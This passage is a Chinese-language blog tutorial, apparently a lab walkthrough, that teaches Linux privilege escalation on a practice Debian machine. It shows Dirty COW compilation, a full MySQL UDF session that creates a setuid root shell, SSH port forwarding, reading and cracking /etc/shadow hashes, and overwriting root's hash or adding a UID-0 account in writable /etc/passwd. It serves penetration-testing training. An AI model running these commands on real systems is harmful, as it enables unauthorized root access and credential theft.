<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630112353863.png" alt="image-20210630112353863"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./linux-exploit-suggester-2.pl -k 2.6.32</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630112537357.png" alt="image-20210630112537357"></p>
<p>可以看到有许多的Dirty COW的漏洞利用</p>

        <h3 id="CVE-2016-5195"   >
          <a href="#CVE-2016-5195" class="heading-link"><i class="fas fa-link"></i></a><a href="#CVE-2016-5195" class="headerlink" title="CVE-2016-5195"></a>CVE-2016-5195</h3>
      <p>这里参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://gist.github.com/KrE80r/42f8629577db95782d5e4f609f437a54" >https://gist.github.com/KrE80r/42f8629577db95782d5e4f609f437a54</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>进行编译</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread c0w.c -o c0w</span><br></pre></td></tr></table></div></figure>

<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630120211277.png" alt="image-20210630120211277"></p>

        <h3 id="漏洞利用"   >
          <a href="#漏洞利用" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3>
      <p>python开始HTTP服务  机器通过wget下载<code>c0w.c</code></p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630113819038.png" alt="image-20210630113819038"></p>
<p>进行编译执行</p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630120237500.png" alt="image-20210630120237500"></p>

        <h3 id="通过二进制文件"   >
          <a href="#通过二进制文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#通过二进制文件" class="headerlink" title="通过二进制文件"></a>通过二进制文件</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/passwd</span><br></pre></td></tr></table></div></figure>


        <h3 id="成功拿到root权限"   >
          <a href="#成功拿到root权限" class="heading-link"><i class="fas fa-link"></i></a><a href="#成功拿到root权限" class="headerlink" title="成功拿到root权限"></a>成功拿到root权限</h3>
      <p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630120353418.png" alt="image-20210630120353418"></p>

        <h1 id="0x05-服务漏洞"   >
          <a href="#0x05-服务漏洞" class="heading-link"><i class="fas fa-link"></i></a><a href="#0x05-服务漏洞" class="headerlink" title="0x05 服务漏洞"></a>0x05 服务漏洞</h1>
      
        <h2 id="前言-3"   >
          <a href="#前言-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#前言-3" class="headerlink" title="前言"></a>前言</h2>
      <p>服务只是在后台运行、接受输入或执行常规任务的程序。<br>如果弱势服务以root权限运行，则利用它们可导致命令执行<br>使用 Searchsploit、谷歌和 GitHub 可以找到服务漏洞，就像使用内核漏洞一样。</p>

        <h2 id="查找以root权限运行的服务"   >
          <a href="#查找以root权限运行的服务" class="heading-link"><i class="fas fa-link"></i></a><a href="#查找以root权限运行的服务" class="headerlink" title="查找以root权限运行的服务"></a>查找以root权限运行的服务</h2>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep &quot;^root&quot;</span><br></pre></td></tr></table></div></figure>


        <h2 id="列举程序版本"   >
          <a href="#列举程序版本" class="heading-link"><i class="fas fa-link"></i></a><a href="#列举程序版本" class="headerlink" title="列举程序版本"></a>列举程序版本</h2>
      <p>使用 命令行选项运行程序通常显示版本编号：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;program&gt; --version</span><br><span class="line">&lt;program&gt; -v</span><br></pre></td></tr></table></div></figure>

<p>类似 Debian 的系统上，dpkg 可以显示已安装的程序及其版本：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -l | grep &lt;program&gt;</span><br></pre></td></tr></table></div></figure>

<p>在使用rpm的系统上</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rpm –qa | grep &lt;program&gt;</span><br></pre></td></tr></table></div></figure>


        <h2 id="实操-2"   >
          <a href="#实操-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#实操-2" class="headerlink" title="实操"></a>实操</h2>
      
        <h3 id="查看以root权限运行的服务"   >
          <a href="#查看以root权限运行的服务" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看以root权限运行的服务" class="headerlink" title="查看以root权限运行的服务"></a>查看以root权限运行的服务</h3>
      <p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630114911170.png" alt="image-20210630114911170"></p>
<p>看到mysql数据库 在以root权限运行</p>

        <h3 id="查看Mysqld的版本号"   >
          <a href="#查看Mysqld的版本号" class="heading-link"><i class="fas fa-link"></i></a><a href="#查看Mysqld的版本号" class="headerlink" title="查看Mysqld的版本号"></a>查看Mysqld的版本号</h3>
      <p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630115710381.png" alt="image-20210630115710381"></p>
<p>Mysql数据库可以用过UDF提权进行实现</p>

        <h3 id="Mysql-UDF提权"   >
          <a href="#Mysql-UDF提权" class="heading-link"><i class="fas fa-link"></i></a><a href="#Mysql-UDF提权" class="headerlink" title="Mysql-UDF提权"></a>Mysql-UDF提权</h3>
      <p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/1518" >https://www.exploit-db.com/exploits/1518</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>安装通过共享对象运行的用户定义功能  进行提权</p>
<p>下载源码到靶机</p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630130745288.png" alt="image-20210630130745288"></p>
<p>用法要进行一些修改</p>
<p>这里要提一下 </p>
<p>gcc编译中的选项</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">加上 fPIC 选项生成的动态库，显然是位置无关的，这样的代码本身就能被放到线性地址空间的任意位置，无需修改就能正确执行</span><br><span class="line">可以理解为放宽了编译通过的维度</span><br></pre></td></tr></table></div></figure>

<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">user@debian:~$ gcc -g -c raptor_udf2.c -fPIC</span><br><span class="line">user@debian:~$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</span><br><span class="line">user@debian:~$ mysql -u root -p</span><br><span class="line">Enter password: </span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 35</span><br><span class="line">Server version: 5.1.73-1+deb6u1 (Debian)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2013, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type &#x27;help;&#x27; or &#x27;\h&#x27; for help. Type &#x27;\c&#x27; to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; use mysql;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; create table foo(line blob);</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into foo values(load_file(&#x27;/home/user/raptor_udf2.so&#x27;));</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from foo into dumpfile &#x27;/usr/lib/mysql/plugin/raptor_udf2.so&#x27;;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; create function do_system returns integer soname &#x27;raptor_udf2.so&#x27;;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select do_system(&#x27;cp /bin/bash /tmp/rootbash;chmod +s /tmp/rootbash&#x27;);</span><br><span class="line">+----------------------------------------------------------------+</span><br><span class="line">| do_system(&#x27;cp /bin/bash /tmp/rootbash;chmod +s /tmp/rootbash&#x27;) |</span><br><span class="line">+----------------------------------------------------------------+</span><br><span class="line">|                                                              0 |</span><br><span class="line">+----------------------------------------------------------------+</span><br><span class="line">1 row in set (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; exit</span><br><span class="line">Bye</span><br><span class="line">user@debian:~$ /tmp/rootbash -p</span><br><span class="line">rootbash-4.1# id</span><br><span class="line">uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630133158537.png" alt="image-20210630133158537"></p>
<p>看看目标机器正在监听的端口</p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630134221883.png" alt="image-20210630134221883"></p>
<p>但是它绑定到 本地主机地址：127.0.0.1 所以我们不能从外部访问它</p>

        <h3 id="端口转发"   >
          <a href="#端口转发" class="heading-link"><i class="fas fa-link"></i></a><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h3>
      <p>某些情况下，root过程可能受约束于内部端口<br>如果由于某种原因，漏洞攻击不能在目标机器上本地运行，则端口可以使用SSH转发到本地机器：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh -R &lt;kali本地端口&gt;:127.0.0.1:&lt; 目标端口 &gt;&lt;苏塞纳梅&gt;@&lt;kali本地IP&gt;</span><br><span class="line">ssh -R 5555:127.0.0.1:3306 root@192.168.175.130</span><br></pre></td></tr></table></div></figure>


        <h1 id="0x06-脆弱的文件权限"   >
          <a href="#0x06-脆弱的文件权限" class="heading-link"><i class="fas fa-link"></i></a><a href="#0x06-脆弱的文件权限" class="headerlink" title="0x06.脆弱的文件权限"></a>0x06.脆弱的文件权限</h1>
      
        <h2 id="前言-4"   >
          <a href="#前言-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#前言-4" class="headerlink" title="前言"></a>前言</h2>
      <p>如果某些系统文件的权限太弱，则可以利用某些系统文件执行权限升级。<br>如果系统文件有我们可以读取的机密信息，则可用于访问root<br>如果可以写入系统文件，我们就可以修改，操作系统的工作方式并以这种方式获得root权限</p>

        <h2 id="相关的命令"   >
          <a href="#相关的命令" class="heading-link"><i class="fas fa-link"></i></a><a href="#相关的命令" class="headerlink" title="相关的命令"></a>相关的命令</h2>
      <p>在<code>/etc:</code>中查找所有可写文件：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /etc -maxdepth 1 -writable -type f</span><br></pre></td></tr></table></div></figure>

<p>在<code>/etc:</code>中查找所有可读文件：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /etc -maxdepth 1 -readable -type f</span><br></pre></td></tr></table></div></figure>

<p>查找可写入的所有目录：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -executable -writable -type d 2&gt; /dev/null</span><br></pre></td></tr></table></div></figure>


        <h2 id="针对-etc-shadow-文件"   >
          <a href="#针对-etc-shadow-文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#针对-etc-shadow-文件" class="headerlink" title="针对/etc/shadow 文件"></a>针对/etc/shadow 文件</h2>
      <p><code>/etc/shadow</code>文件包含用户密码哈希值，默认情况下，除root用户外，任何用户都无法读取。</p>
<ul>
<li>思路一：<br>如果我们能够读取 /etc/shadow 文件的内容，我们也许能够破解根用户的密码哈希。</li>
<li>思路二：<br>如果我们能够修改/etc/shadow文件，我们可以用我们所知道的密码哈希替换root用户的密码哈希</li>
</ul>

        <h3 id="实操一、"   >
          <a href="#实操一、" class="heading-link"><i class="fas fa-link"></i></a><a href="#实操一、" class="headerlink" title="实操一、"></a>实操一、</h3>
      
        <h4 id="1-检查权限-etc-shadow-文件"   >
          <a href="#1-检查权限-etc-shadow-文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-检查权限-etc-shadow-文件" class="headerlink" title="1.检查权限 /etc/shadow 文件"></a>1.检查权限 /etc/shadow 文件</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /etc/shadow </span><br></pre></td></tr></table></div></figure>





<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630140751442.png" alt="image-20210630140751442"></p>

        <h4 id="2-提取root用户的密码哈希"   >
          <a href="#2-提取root用户的密码哈希" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-提取root用户的密码哈希" class="headerlink" title="2.提取root用户的密码哈希"></a>2.提取root用户的密码哈希</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">head -n 1 /etc/shadow</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630140948488.png" alt="image-20210630140948488"></p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::</span><br></pre></td></tr></table></div></figure>


        <h4 id="3-将密码哈希保存在文件中"   >
          <a href="#3-将密码哈希保存在文件中" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-将密码哈希保存在文件中" class="headerlink" title="3.将密码哈希保存在文件中"></a>3.将密码哈希保存在文件中</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0&#x27; &gt; &#x27;hash.txt&#x27;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630141431879.png" alt="image-20210630141431879"></p>

        <h4 id="4-使用开膛手破解密码哈希"   >
          <a href="#4-使用开膛手破解密码哈希" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-使用开膛手破解密码哈希" class="headerlink" title="4.使用开膛手破解密码哈希"></a>4.使用开膛手破解密码哈希</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630141447898.png" alt="image-20210630141447898"></p>

        <h4 id="5-使用su-命令切换到root用户"   >
          <a href="#5-使用su-命令切换到root用户" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-使用su-命令切换到root用户" class="headerlink" title="5.使用su 命令切换到root用户"></a>5.使用su 命令切换到root用户</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su</span><br></pre></td></tr></table></div></figure>

<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630141653620.png" alt="image-20210630141653620"></p>

        <h3 id="实操二、"   >
          <a href="#实操二、" class="heading-link"><i class="fas fa-link"></i></a><a href="#实操二、" class="headerlink" title="实操二、"></a>实操二、</h3>
      
        <h4 id="1-检查权限-etc-shadow-文件："   >
          <a href="#1-检查权限-etc-shadow-文件：" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-检查权限-etc-shadow-文件：" class="headerlink" title="1.检查权限/etc/shadow 文件："></a>1.检查权限/etc/shadow 文件：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /etc/shadow </span><br></pre></td></tr></table></div></figure>


        <h4 id="2-复制保存-etc-shadow-的内容，以便我们以后可以恢复"   >
          <a href="#2-复制保存-etc-shadow-的内容，以便我们以后可以恢复" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-复制保存-etc-shadow-的内容，以便我们以后可以恢复" class="headerlink" title="2.复制保存/etc/shadow 的内容，以便我们以后可以恢复"></a>2.复制保存/etc/shadow 的内容，以便我们以后可以恢复</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rw-r--rw- 1 root shadow 837 Aug 25  2019 /etc/shadow</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630142720204.png" alt="image-20210630142720204"></p>

        <h4 id="3-生成-新的-SHA-512-密码-哈希："   >
          <a href="#3-生成-新的-SHA-512-密码-哈希：" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-生成-新的-SHA-512-密码-哈希：" class="headerlink" title="3.生成 新的 SHA-512 密码 哈希："></a>3.生成 新的 SHA-512 密码 哈希：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkpasswd -m sha-512 password    </span><br><span class="line">$6$WLjW9I7t4e7hhgDy$5smTCs43aPOZCR3KrG.BGuyzDyjsegc3ix3lRSZfX.O26gKGsznN6x9rs6jtxh5//qEZNS2IOUCvgbUQrAU04.</span><br></pre></td></tr></table></div></figure>

<p>root用户的密码：password</p>

        <h4 id="4-编辑-etc-shadow，并将根用户的密码哈希替换为我们生成的密码。"   >
          <a href="#4-编辑-etc-shadow，并将根用户的密码哈希替换为我们生成的密码。" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-编辑-etc-shadow，并将根用户的密码哈希替换为我们生成的密码。" class="headerlink" title="4.编辑/etc/shadow，并将根用户的密码哈希替换为我们生成的密码。"></a>4.编辑/etc/shadow，并将根用户的密码哈希替换为我们生成的密码。</h4>
      <p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630144055411.png" alt="image-20210630144055411"></p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630144137065.png" alt="image-20210630144137065"></p>

        <h4 id="5-使用su-命令切换到根用户"   >
          <a href="#5-使用su-命令切换到根用户" class="heading-link"><i class="fas fa-link"></i></a><a href="#5-使用su-命令切换到根用户" class="headerlink" title="5.使用su 命令切换到根用户"></a>5.使用su 命令切换到根用户</h4>
      <p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630144159777.png" alt="image-20210630144159777"></p>

        <h2 id="针对-etc-passwd文件"   >
          <a href="#针对-etc-passwd文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#针对-etc-passwd文件" class="headerlink" title="针对/etc/passwd文件"></a>针对/etc/passwd文件</h2>
      
        <h3 id="前言-5"   >
          <a href="#前言-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#前言-5" class="headerlink" title="前言"></a>前言</h3>
      <p> <code>/etc/passwd</code>历史上包含用户密码哈希。 </p>
<p> <strong>为了向后兼容，如果/etc/passwd中用户行的第二个字段包含密码哈希，它优先于/etc/shadow中的哈希</strong></p>
<p> 如果我们可以写入<code>/etc/passwd</code>，我们就可以很容易地输入一个已知的密码散列 root用户，然后使用su命令切换到根用户。 </p>
<p> 或者，如果我们只能附加到文件，我们可以创建一个新的用户，为他们分配根用户ID(0)。</p>
<p>这是因为Linux允许多个条目，对于相同的用户名，只要用户名不同 </p>
<p>/etc/passwd的root帐户配置的：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash #通常</span><br></pre></td></tr></table></div></figure>

<p>第二个字段中的<code>x</code>指示 Linux 查找 /etc/shadow文件中的密码哈希。</p>
<p>在Linux的某些版本中，可以简单地删除<code>x</code>，Linux 将其解释为用户没有密码：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root::0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></div></figure>


        <h3 id="实操-3"   >
          <a href="#实操-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#实操-3" class="headerlink" title="实操"></a>实操</h3>
      
        <h4 id="检查-etc-passwd文件的权限："   >
          <a href="#检查-etc-passwd文件的权限：" class="heading-link"><i class="fas fa-link"></i></a><a href="#检查-etc-passwd文件的权限：" class="headerlink" title="检查/etc/passwd文件的权限："></a>检查/etc/passwd文件的权限：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l /etc/passwd </span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630145719525.png" alt="image-20210630145719525"></p>

        <h4 id="2-使用openssl生成密码哈希："   >
          <a href="#2-使用openssl生成密码哈希：" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-使用openssl生成密码哈希：" class="headerlink" title="2.使用openssl生成密码哈希："></a>2.使用openssl生成密码哈希：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd &quot;qwer&quot; </span><br></pre></td></tr></table></div></figure>

<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630145846124.png" alt="image-20210630145846124"></p>

        <h4 id="3-编辑-etc-passwd文件"   >
          <a href="#3-编辑-etc-passwd文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-编辑-etc-passwd文件" class="headerlink" title="3.编辑 /etc/passwd文件"></a>3.编辑 <code>/etc/passwd</code>文件</h4>
      <p>输入root用户行第二个字段中的哈希：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZSL11eCDBkMnk</span><br></pre></td></tr></table></div></figure>





<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630145957018.png" alt="image-20210630145957018"></p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630150036456.png" alt="image-20210630150036456"></p>
<p>保存 退出</p>

        <h4 id="4-使用su命令切换到根用户"   >
          <a href="#4-使用su命令切换到根用户" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-使用su命令切换到根用户" class="headerlink" title="4.使用su命令切换到根用户"></a>4.使用su命令切换到根用户</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630150207862.png" alt="image-20210630150207862"></p>
<p>因为优先级问题 所以机器root账户的密码是：qwer</p>

        <h4 id="or"   >
          <a href="#or" class="heading-link"><i class="fas fa-link"></i></a><a href="#or" class="headerlink" title="or"></a>or</h4>
      
        <h4 id="1-创建备用根用户"   >
          <a href="#1-创建备用根用户" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-创建备用根用户" class="headerlink" title="1.创建备用根用户"></a>1.创建备用根用户</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qwer:ZSL11eCDBkMnk:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></div></figure>

<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630150549882.png" alt="image-20210630150549882"></p>

        <h4 id="2-使用su命令切换到新根用户："   >
          <a href="#2-使用su命令切换到新根用户：" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-使用su命令切换到新根用户：" class="headerlink" title="2.使用su命令切换到新根用户："></a>2.使用su命令切换到新根用户：</h4>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">su</span><br></pre></td></tr></table></div></figure>

<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630150624343.png" alt="image-20210630150624343"></p>

        <h2 id="备份"   >
          <a href="#备份" class="heading-link"><i class="fas fa-link"></i></a><a href="#备份" class="headerlink" title="备份"></a>备份</h2>
      
        <h3 id="前言-6"   >
          <a href="#前言-6" class="heading-link"><i class="fas fa-link"></i></a><a href="#前言-6" class="headerlink" title="前言"></a>前言</h3>
      <p>即使计算机在重要或敏感文件上拥有正确的权限，用户也可能已创建这些文件的不安全备份。<br>它总是值得探索的文件系统寻找可读的备份文件。</p>
<p>一些常见的地方包括 / (root) directory, /tmp, and /var/backups</p>

        <h3 id="实操-4"   >
          <a href="#实操-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#实操-4" class="headerlink" title="实操"></a>实操</h3>
      
        <h3 id="1-在常见位置查找文件，尤其是一些隐藏文件"   >
          <a href="#1-在常见位置查找文件，尤其是一些隐藏文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#1-在常见位置查找文件，尤其是一些隐藏文件" class="headerlink" title="1.在常见位置查找文件，尤其是一些隐藏文件"></a>1.在常见位置查找文件，尤其是一些隐藏文件</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ls -la /home/user </span><br><span class="line">ls -la / </span><br><span class="line">ls -la /tmp </span><br><span class="line">ls -la /var/backups</span><br></pre></td></tr></table></div></figure>



<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630151315783.png" alt="image-20210630151315783"></p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630151343205.png" alt="image-20210630151343205"></p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630151358879.png" alt="image-20210630151358879"></p>
<p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630151410318.png" alt="image-20210630151410318"></p>

        <h3 id="2-root目录下存在隐藏的-ssh目录："   >
          <a href="#2-root目录下存在隐藏的-ssh目录：" class="heading-link"><i class="fas fa-link"></i></a><a href="#2-root目录下存在隐藏的-ssh目录：" class="headerlink" title="2.root目录下存在隐藏的.ssh目录："></a>2.root目录下存在隐藏的<code>.ssh</code>目录：</h3>
      <figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drwxr-xr-x 2 root root 4096 Aug 24 18:57 .ssh</span><br></pre></td></tr></table></div></figure>


        <h3 id="3-翻看-ssh目录"   >
          <a href="#3-翻看-ssh目录" class="heading-link"><i class="fas fa-link"></i></a><a href="#3-翻看-ssh目录" class="headerlink" title="3.翻看.ssh目录"></a>3.翻看<code>.ssh</code>目录</h3>
      <p><img src="https://gitee.com/work-hard-every-day/test/raw/master/img/image-20210630151814494.png" alt="image-20210630151814494"></p>
<p>一个可读的文件<code>root_key</code></p>

        <h3 id="4-进一步检查root-key文件"   >
          <a href="#4-进一步检查root-key文件" class="heading-link"><i class="fas fa-link"></i></a><a href="#4-进一步检查root-key文件" class="headerlink" title="4.进一步检查root_key文件"></a>4.进一步检查root_key文件</h3>
